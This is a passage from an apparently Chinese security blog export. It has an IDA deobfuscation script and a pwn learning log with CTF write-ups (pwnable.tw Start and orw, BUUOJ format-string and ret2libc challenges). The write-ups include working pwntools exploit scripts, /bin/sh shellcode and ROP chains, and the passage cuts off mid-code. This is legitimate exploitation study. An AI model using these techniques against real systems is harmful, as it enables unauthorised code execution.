<td>24</td>
</tr>
<tr>
<td>FUNCATTR_FRSIZE</td>
<td>20</td>
</tr>
<tr>
<td>FUNCATTR_OWNER</td>
<td>16</td>
</tr>
<tr>
<td>FUNCATTR_REFQTY</td>
<td>20</td>
</tr>
<tr>
<td>FUNCATTR_START</td>
<td>0</td>
</tr>
<tr>
<td>FUNC_BOTTOMBP</td>
<td>256</td>
</tr>
<tr>
<td>FUNC_FAR</td>
<td>2</td>
</tr>
<tr>
<td>FUNC_FRAME</td>
<td>16</td>
</tr>
<tr>
<td>FUNC_HIDDEN</td>
<td>64</td>
</tr>
<tr>
<td>FUNC_LIB</td>
<td>4</td>
</tr>
<tr>
<td>FUNC_LUMINA</td>
<td>65536</td>
</tr>
<tr>
<td>FUNC_NORET</td>
<td>1</td>
</tr>
<tr>
<td>FUNC_NORET_PENDING</td>
<td>512</td>
</tr>
<tr>
<td>FUNC_OUTLINE</td>
<td>131072</td>
</tr>
<tr>
<td>FUNC_PURGED_OK</td>
<td>16384</td>
</tr>
<tr>
<td>FUNC_SP_READY</td>
<td>1024</td>
</tr>
<tr>
<td>FUNC_STATIC</td>
<td>8</td>
</tr>
<tr>
<td>FUNC_TAIL</td>
<td>32768</td>
</tr>
<tr>
<td>FUNC_THUNK</td>
<td>128</td>
</tr>
<tr>
<td>FUNC_USERFAR</td>
<td>32</td>
</tr>
</tbody></table>
<h3 id="对二进制文件进行操作"><a href="#对二进制文件进行操作" class="headerlink" title="对二进制文件进行操作"></a>对二进制文件进行操作</h3><h4 id="patch-byte-ea-x-bool-patch-bytes-ea-buf-bool"><a href="#patch-byte-ea-x-bool-patch-bytes-ea-buf-bool" class="headerlink" title="patch_byte(ea, x) -&gt; bool | patch_bytes(ea, buf) -&gt; bool"></a>patch_byte(ea, x) -&gt; bool | patch_bytes(ea, buf) -&gt; bool</h4><p>分别用于将ea处的1个和多个字节patch成目标字节<code>x</code>或目标字节串<code>buf</code> 返回patch的结果是否成功</p>
<h5 id="用IDA去虚拟跳转混淆"><a href="#用IDA去虚拟跳转混淆" class="headerlink" title="用IDA去虚拟跳转混淆"></a>用IDA去虚拟跳转混淆</h5><p>之前使用Angr符号执行的方式去虚拟跳转时提到过 IDA可以直接计算出跳转的终点 可以利用这个特性来大大简化去除混淆的过程:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi, idc, idautils</span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> * <span class="number">20</span>)</span><br><span class="line">ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">funcs = <span class="built_in">list</span>(idautils.Functions())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(funcs)):</span><br><span class="line">    ea = funcs[i]</span><br><span class="line">    end = idc.get_func_attr(funcs[i], idc.FUNCATTR_END)</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        opcode = idc.GetDisasm(ea).split()</span><br><span class="line">        <span class="keyword">if</span> opcode[<span class="number">0</span>] == <span class="string">&#x27;MOV&#x27;</span> <span class="keyword">and</span> opcode[<span class="number">1</span>] == <span class="string">&#x27;PC,&#x27;</span>:</span><br><span class="line">            new_op = <span class="string">f&quot;B <span class="subst">&#123;<span class="string">&#x27;0x&#x27;</span> + opcode[-<span class="number">1</span>].partition(<span class="string">&#x27;_&#x27;</span>)[<span class="number">2</span>]&#125;</span>&quot;</span></span><br><span class="line">            new_opcode = ks.asm(new_op, ea - <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            NOP = ks.asm(<span class="string">&#x27;NOP&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;ea:08x&#125;: &#123;idc.GetDisasm(ea)&#125; -&gt; &#123;new_op&#125; with &#123;new_opcode&#125;&quot;)</span></span><br><span class="line">            idaapi.patch_bytes(ea - <span class="number">2</span>, <span class="built_in">bytes</span>(NOP * <span class="number">2</span>))</span><br><span class="line">            idaapi.patch_bytes(ea - <span class="number">2</span>, <span class="built_in">bytes</span>(new_opcode))</span><br><span class="line">        lenth = idaapi.decode_insn(idaapi.insn_t(), ea)</span><br><span class="line">        ea += <span class="built_in">max</span>(lenth, <span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn学习记录</title>
    <url>/2024/05/22/Pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>记录一下入门Pwn的心路历程</p>
<span id="more"></span>

<h1 id="零碎知识"><a href="#零碎知识" class="headerlink" title="零碎知识"></a>零碎知识</h1><h2 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h2><p>只描述方便我自己理解的 不一定标准</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high</span><br><span class="line"> ↑</span><br><span class="line">     ...</span><br><span class="line">     Caller&#x27;s rbp</span><br><span class="line">     (Callee&#x27;s Registers)</span><br><span class="line">    Buf(Local variables)</span><br><span class="line">     Return Addr</span><br><span class="line"> ↓</span><br><span class="line">low</span><br></pre></td></tr></table></figure>

<p><code>call func</code>指令执行时会先将call指令的下一条指令push入栈 退出函数时保证堆栈平衡即rsp恢复到调用程序前一行的状态 函数结束前通过leave或直接<code>add rsp, xxx</code>来达到堆栈平衡</p>
<h2 id="GEF常用指令"><a href="#GEF常用指令" class="headerlink" title="GEF常用指令"></a>GEF常用指令</h2><h3 id="telescope-dereference-register"><a href="#telescope-dereference-register" class="headerlink" title="telescope | dereference [register]"></a>telescope | dereference [register]</h3><p>递归地解引用某寄存器所含地址</p>
<h3 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h3><p>pattern creat [lenth]</p>
<p>创建长度为lenth的负载 负载的形式可以搭配下一个指令进行栈溢出长度的计算</p>
<p>pattern search [register]</p>
<p>查找创建的负载中哪4&#x2F;8字节(根据程序的平台)与目标寄存器中的相同 以此可以通过传入<code>$rsp</code>计算栈溢出长度</p>
<h2 id="IDA配合Pwntools进行动态调试"><a href="#IDA配合Pwntools进行动态调试" class="headerlink" title="IDA配合Pwntools进行动态调试"></a>IDA配合Pwntools进行动态调试</h2><p>因为正常IDA启动程序无法输入不可打印字符 所以需要配合pwntools发送数据 实现这个功能的具体步骤:</p>
<p>1.用socat进行端口转发</p>
<p><code>socat TCP-LISTEN:19961,reuseaddr,fork EXEC:./Program_to_debug,pty,raw,echo=0</code></p>
<p>执行指令后<code>Program_to_debug</code>会立即启动并监听本机<code>19961</code>端口</p>
<p>2.用pwntools附加到程序</p>
<p>Python中导入pwn后使用<code>io = remote(&#39;127.0.0.1&#39;, 19961)</code>来建立和程序的链接 此时可以使用<code>io.send()</code>来发送数据</p>
<p>3.用IDA附加到程序</p>
<p><code>Debugger</code>选项卡中选择远端调试-&gt;附加到程序就能看到刚刚启用的的待调试程序:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-130646.png" alt="image-20240528130639443"></p>
<p>注意事项:</p>
<p>运行程序前要先在想要停下的地方下好断点 运行起来后IDA直接F9运行 这时候程序会运行到第一个输入处 一般在输入后下断点并在Python终端中向程序发送数据 发送完数据后程序就会断在刚刚下好的断点处</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131047.png" alt="image-20240528131047508"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/28/20240528-131106.png" alt="image-20240528131106868"></p>
<h1 id="刷题记录"><a href="#刷题记录" class="headerlink" title="刷题记录"></a>刷题记录</h1><h2 id="Pwnable-tw-Start-stackoverflow-ret2shellcode"><a href="#Pwnable-tw-Start-stackoverflow-ret2shellcode" class="headerlink" title="Pwnable.tw-Start | stackoverflow | ret2shellcode"></a>Pwnable.tw-Start | stackoverflow | ret2shellcode</h2><p>题目给的二进制文件很简单 直接用系统调用来输出提示和输入 然后<code>_exit</code>退出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048060 54                            push    esp</span><br><span class="line">.text:08048061 68 9D 80 04 08                push    offset _exit</span><br><span class="line">.text:08048066 31 C0                         xor     eax, eax</span><br><span class="line">.text:08048068 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:0804806A 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804806C 31 D2                         xor     edx, edx</span><br><span class="line">.text:0804806E 68 43 54 46 3A                push    3A465443h</span><br><span class="line">.text:08048073 68 74 68 65 20                push    20656874h</span><br><span class="line">.text:08048078 68 61 72 74 20                push    20747261h</span><br><span class="line">.text:0804807D 68 73 20 73 74                push    74732073h</span><br><span class="line">.text:08048082 68 4C 65 74 27                push    2774654Ch</span><br><span class="line">.text:08048087 89 E1                         mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 B2 14                         mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B B3 01                         mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D B0 04                         mov     al, 4</span><br><span class="line">.text:0804808F CD 80                         int     80h                             ; LINUX - sys_write</span><br><span class="line">.text:0804808F</span><br><span class="line">.text:08048091 31 DB                         xor     ebx, ebx</span><br><span class="line">.text:08048093 B2 3C                         mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095 B0 03                         mov     al, 3</span><br><span class="line">.text:08048097 CD 80                         int     80h                             ; LINUX -</span><br><span class="line">.text:08048097</span><br><span class="line">.text:08048099 83 C4 14                      add     esp, 14h</span><br><span class="line">.text:0804809C C3                            retn</span><br><span class="line">.text:0804809C</span><br><span class="line">.text:0804809C                               _start endp ; sp-analysis failed</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; Attributes: noreturn</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               ; void exit(int status)</span><br><span class="line">.text:0804809D                               _exit proc near                         ; DATA XREF: _start+1↑o</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D                               status= dword ptr  4</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D 5C                            pop     esp</span><br><span class="line">.text:0804809E 31 C0                         xor     eax, eax</span><br><span class="line">.text:080480A0 40                            inc     eax</span><br><span class="line">.text:080480A1 CD 80                         int     80h</span><br></pre></td></tr></table></figure>

<p><code>checksec</code>可以看到保护全关 <code>vmmap</code>发现栈可写可执行 用gdb调试一下可以发现有栈溢出<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/05/22/20240522-194541.png" alt="image-20240522194534063"></p>
<p>并且返回地址距离输入缓冲区起点20bytes 对应<code>ret</code>前的<code>add esp, 0x14</code> 但是一次输入即使修改返回地址也没有现成的漏洞可以利用 所以利用栈可执行来看看能不能ret2shellcode 思路是<code>ret</code>指令执行后esp指向自己当前的地址 这时候再进行系统调用就会泄露esp内容 所以第一个payload可以这样写:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>]</span><br><span class="line">sh = process([<span class="string">&quot;./start&quot;</span>])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">ret = <span class="number">0x8048087</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(ret)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>至于send和sendline的区别借用一下这位师傅的<a href="https://zikh26.github.io/posts/9fda4edb.html?highlight=pwntools">讲解</a> 总之<code>sys-read</code>会将<code>\n</code>读到栈上 所以用send</p>
<p>下一步就是返回到shellcode上 从<code>add esp, 0x14</code> 可以知道返回地址还是距离缓冲区起点20bytes 这意味着shellcode长度需要在20bytes以内 可以在<a href="http://shell-storm.org/shellcode/index.html">这个网站</a>找合适的shellcode或者等以后我能力够了自己写( 所以第二个payload可以这样写:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>最后拿到flag</p>
<h2 id="Pwnable-tw-orw-shellcode"><a href="#Pwnable-tw-orw-shellcode" class="headerlink" title="Pwnable.tw-orw | shellcode"></a>Pwnable.tw-orw | shellcode</h2><p>题目描述只能使用<code>open</code> <code>read</code> <code>write</code>系统调用 flag目录在<code>/home/orw/flag</code> 程序没有对输入有任何过滤 对输入的长度也几乎没有限制 可以直接用pwntools的shellcraft构造shellcode <a href="https://filippo.io/linux-syscall-table/">这个网站</a>可以查到linux系统调用约定</p>
<p>查到<code>open</code>第一个参数为文件路径 第二个参数为读写标志位 返回的文件指针按照i86调用约定存放在<code>EAX</code>中 然后再用<code>read</code>读取文件并将其存放到一个缓冲区中 最后用<code>write</code>指定标准输出流为文件指针将缓冲区的内容写到输出流中:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">sh = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>, <span class="number">0</span>)    //以READ_ONLY(<span class="number">0</span>)标志位打开文件</span><br><span class="line">shellcode += shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)    //以esp作为缓冲区指针 读取<span class="number">100</span>字节</span><br><span class="line">shellcode += shellcraft.i386.linux.write(<span class="number">1</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">100</span>)        //<span class="number">1</span>为标准输出流</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(sh.recv(<span class="number">100</span>))</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-第五空间2019-决赛-PWN5-格式化字符串漏洞"><a href="#BUUOJ-第五空间2019-决赛-PWN5-格式化字符串漏洞" class="headerlink" title="BUUOJ-[第五空间2019 决赛]PWN5 | 格式化字符串漏洞"></a>BUUOJ-[第五空间2019 决赛]PWN5 | 格式化字符串漏洞</h2><p><code>checksec</code>发现开了<code>NX</code>和<code>canary</code> 关闭了随机硬件地址 IDA打开看看主函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;random, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == random )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要流程为用随机数生成器生成一个双字随机数 然后输入两个字符串 输入name后会有回显 输入passwd后与生成的随机数对比 相同的话就能拿到shell</p>
<p>输入的两个字符串都不足以达到栈溢出 而且还开启了canary防护 所以思路从ret2text转向格式化字符串漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/03/20240603-232932.png" alt="image-20240603232924979"></p>
<p>随机数是bss段上<code>0x804C044~0x804C047</code>的一个双字内存 因为没有开随机硬件地址 所以可以直接利用<code>%n</code>来修改这个值</p>
<h3 id="格式化字符串漏洞要点-待补充"><a href="#格式化字符串漏洞要点-待补充" class="headerlink" title="格式化字符串漏洞要点(待补充)"></a>格式化字符串漏洞要点(待补充)</h3><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">printf泄露栈上的内存的原理</a> 以下介绍两个常用的漏洞利用手段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;xxxxx%n&quot;</span>, p)        <span class="comment">//假设%n前的&quot;xxxxx&quot;长度为 m bytes p是一个指向__int64的指针 那么printf不会输出%n或者p 而是输出&quot;xxxxx&quot;并将 m 赋给*p</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%[Num]$x&quot;</span>)            <span class="comment">//以%x的方式打印栈上&quot;%[A number]$x&quot;这个字符串的地址后的第Num个内存单元储存的内容</span></span><br><span class="line">                            <span class="comment">//例如printf(&quot;%3$x&quot;, 0x10, 0x100, 0x200)会输出200</span></span><br></pre></td></tr></table></figure>

<p>了解了这些基础知识就能利用格式化字符串漏洞来泄露栈中的信息并修改内存 于是第一次发送payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + <span class="string">b&#x27;--&#x27;</span>.join([<span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;:%#x&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x10</span>)])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br></pre></td></tr></table></figure>

<p>得到回显<code>b&#39;Hello,aaaa1:0xffbec598--2:0x63--3:0--4:0x3e8--5:0x3--6:0xf7fa3c08--7:0xffbec600--8:0xf7fa2ff4--9:0xc--10:0x61616161--11:0x23253a31--12:0x322d2d78--13:0x7823253a--\xf7your passwd:fail\n&#39;</code></p>
<p>可以看到输入的内容出现在了栈上格式化字符串后第10个内存单元 那么这时候如果输入的是<code>0x804C044~0x804C047</code> 那么从<code>%10$x</code>开始的4个内存单元存放的就是<code>random</code>每字节的地址 将格式化字符串写成<code>%10$n</code>开始的四个内存单元就能根据输入的长度(四个内存连在一起形成的字符串的长度 即0x10)来修改random的值 所以第二次发送payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;269488144&#x27;</span>)    <span class="comment">#0x10101010</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>即可拿到shell</p>
<h2 id="BUUOJ-ciscn-2019-c-1-ret2libc"><a href="#BUUOJ-ciscn-2019-c-1-ret2libc" class="headerlink" title="BUUOJ-ciscn_2019_c_1 | ret2libc"></a>BUUOJ-ciscn_2019_c_1 | ret2libc</h2><p>程序有两个能输入的地方 <code>encrypt()</code>中有明显的栈溢出:</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-150927.png" alt="image-20240613150920256" style="zoom: 67%;" />

<p>vmmap查看一下各个段的权限:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-151130.png" alt="image-20240613151130505"></p>
<p>没有可写可执行的段 所以思路转向<code>ret2libc</code> 题目没有给对应版本的.so库 所以测试的时候需要连上靶机获取环境</p>
<p>ret2libc构造ROP的思路是用程序本身加载到虚拟内存空间中的libc函数来泄露libc在虚拟内存中的绝对基址 再通过基址获取到加载到虚拟内存中的<code>system()</code>和<code>b&#39;\bin\sh&#39;</code>来获取shell或者调用任意libc中的函数</p>
<h3 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h3><p>GOT表记录了程序所使用的外部函数(libc中的函数)在虚拟内存中的绝对地址 只有在程序运行时才能获取每个函数具体的地址</p>
<p>PLT表是由多段用于调用外部函数的代码块组成的 当程序调用其中一段时这段代码会从GOT中获取要调用的外部函数的地址并执行</p>
<p>这个程序中可以先用<code>puts</code>来泄露自己的地址从而获取libc的基址 对64位程序要将puts的地址作为参数调用puts需要将GOT表中的puts地址存放在rdi中(<a href="https://wiki.osdev.org/System_V_ABI">Linux调用约定</a>)  要将栈上的内容赋值给寄存器就要寻找<code>pop rdi;ret</code>的gadget:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-153801.png" alt="image-20240613153801587"></p>
<p>同时Ubuntu系统要求程序的栈平衡 ret指令的地址也会在payload中用到</p>
<p>第一段获取libc基址的payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pading = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x58</span> - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = pading + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_libc = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># print(hex(puts_libc))</span></span><br></pre></td></tr></table></figure>

<p>第二段用于获取shell的payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_libc)</span><br><span class="line">libc_base = puts_libc - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = pading + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>由于Ubuntu≥18版本system函数中用到<code>movaps</code>指令要求栈0x10对其 所以需要保证system函数入口地址存放在原返回地址在栈中的位置的+0x10N bytes位置 用<code>ret</code>指令的地址来填充中间需要填充的位置即可</p>
<h2 id="BUUOJ-OGeek2019-babyrop-ret2libc"><a href="#BUUOJ-OGeek2019-babyrop-ret2libc" class="headerlink" title="BUUOJ-[OGeek2019]babyrop | ret2libc"></a>BUUOJ-[OGeek2019]babyrop | ret2libc</h2><p>checksec一下开了Full RELRO和NX 那基本上只能考虑ret2libc了</p>
<p>伪代码(原程序去掉了符号表):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">handler</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Time&#x27;s up&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = input(buf);</span><br><span class="line">  vuln(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">input</span><span class="params">(<span class="type">int</span> randbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, randbytes);</span><br><span class="line">  v5 = read(<span 